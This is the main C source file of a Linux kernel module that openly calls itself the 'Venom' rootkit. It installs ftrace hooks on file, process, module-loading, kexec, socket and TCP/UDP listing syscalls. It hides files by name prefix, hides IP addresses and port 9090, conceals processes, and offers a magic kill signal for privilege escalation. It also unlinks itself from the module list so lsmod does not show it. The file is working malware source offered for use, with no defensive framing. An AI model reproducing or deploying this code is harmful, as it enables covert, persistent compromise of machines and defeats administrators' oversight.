#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include "include/headers.h"
#include "ftrace/ftrace.h"
#include "hooks/prinT.h"

#include "hooks/write.h"
#include "hooks/read.h"
#include "hooks/mounts.h"
#include "hooks/pid_hiding.h"
#include "hooks/getdents.h"
#include "hooks/kill.h"
#include "hooks/ioctl.h"
#include "hooks/insmod.h"
#include "hooks/network.h"
#include "hooks/harden.h"
#include "hooks/kexec_load.h"
#include "hooks/socket.h"
#include "hooks/statx.h" 


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Trevohack");
MODULE_DESCRIPTION("Advance LKM");
MODULE_VERSION("4.0");


#define HIDDEN_PORT 9090 
#define MAGIC_KILL_SIGNAL 64 
#define MAX_HIDDEN_PREFIXES 10
#define MAX_HIDDEN_IPS 5


static char *hidden_prefixes[MAX_HIDDEN_PREFIXES] = {
    "source-code",
    "halo",
    "tom",
    "venom",
    "trevohack",
    "hack",
    ".defense",
    NULL
};


static char *hidden_ips[MAX_HIDDEN_IPS] = {
    "10.0.0.100",
    "192.168.1.50", 
    "172.16.0.10",
    NULL
};


static int hidden = 0;
static int activate_stealth = 1;

static struct ftrace_hook all_hooks[] = {
    HOOK("__x64_sys_write", hooked_write, &orig_write),
    HOOK("__x64_sys_read", hooked_read, &orig_read),
    HOOK("__x64_sys_pread64", hooked_pread64, &orig_pread64),
    HOOK("__x64_sys_pwrite64", hooked_pwrite64, &orig_pwrite64),
    HOOK("__x64_sys_mount", hook_mount, &orig_mount),
    HOOK("__x64_sys_move_mount", hook_move_mount, &orig_move_mount),
    HOOK("__x64_sys_getdents64", hooked_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hooked_getdents, &orig_getdents),
    HOOK("__x64_sys_openat", hooked_openat, &orig_openat),
    HOOK("__x64_sys_unlinkat", hooked_unlinkat, &orig_unlinkat),
    HOOK("__x64_sys_renameat", hooked_renameat, &orig_renameat),
    HOOK("__x64_sys_truncate", hooked_truncate, &orig_truncate),


    HOOK("__x64_sys_init_module", hooked_init_module, &orig_init_module),
    HOOK("__x64_sys_finit_module", hooked_finit_module, &orig_finit_module),
    HOOK("__x64_sys_delete_module", hooked_delete_module, &orig_delete_module),


    HOOK("__x64_sys_kexec_load", hooked_kexec_load, &orig_kexec_load),

    HOOK("__x64_sys_kill", hooked_kill, &orig_kill),
    HOOK("__x64_sys_ioctl", hooked_ioctl, &orig_ioctl),

    HOOK("__x64_sys_socket", hooked_socket, &orig_socket),
    HOOK("__x64_sys_setsockopt", hooked_setsockopt, &orig_setsockopt),
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hooked_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hooked_udp6_seq_show, &orig_udp6_seq_show),
    HOOK("tpacket_rcv", hooked_tpacket_rcv, &orig_tpacket_rcv),


};


notrace static void hide_module(void) {
    if (THIS_MODULE->list.prev) {
        list_del(&THIS_MODULE->list);
        hidden = 1;
    }
}


notrace static void init_rootkit_config(void) {
    set_hidden_port(HIDDEN_PORT);
    set_magic_signal(MAGIC_KILL_SIGNAL);
    set_hidden_prefixes(hidden_prefixes);
    set_hidden_ips(hidden_ips);
}

notrace static int __init venom_init(void) {
    int err;
    
    // TLOG_INF("[VENOM] Loading Rootkit v4.0\n");
    
    init_rootkit_config();
    

    err = fh_install_hooks(all_hooks, ARRAY_SIZE(all_hooks));
    if (err) {
        TLOG_ERROR("[VENOM] Failed to install hooks: %d\n", err);
        return err;
    }
    
    init_pid_hiding();
    
    if (activate_stealth) {
        hide_module();
        TLOG_INF("[VENOM] Module hidden from lsmod\n");
    }
    

    TLOG_INF("╔════════════════════════════════════════════════════════════════════════════╗\n");
    TLOG_INF("║                                                                            ║\n");
    TLOG_INF("║   ░░░░░░░░░░░░░░░░  [  V E N O M   I M P L A N T E D  ]  ░░░░░░░░░░░       ║\n");
    TLOG_INF("║                    ──   trev • devil • obscurity  ──                       ║\n");
    TLOG_INF("║                                                                            ║\n");
    TLOG_INF("╚════════════════════════════════════════════════════════════════════════════╝\n");

    TLOG_INF("[VENOM] All protection systems active\n");
    TLOG_INF("[VENOM] Protected port: %d\n", HIDDEN_PORT);
    TLOG_INF("[VENOM] Magic signal: %d (for privilege escalation)\n", MAGIC_KILL_SIGNAL);

    
    return 0;
}

notrace static void __exit venom_exit(void) {
    fh_remove_hooks(all_hooks, ARRAY_SIZE(all_hooks));

}

module_init(venom_init);
module_exit(venom_exit); 

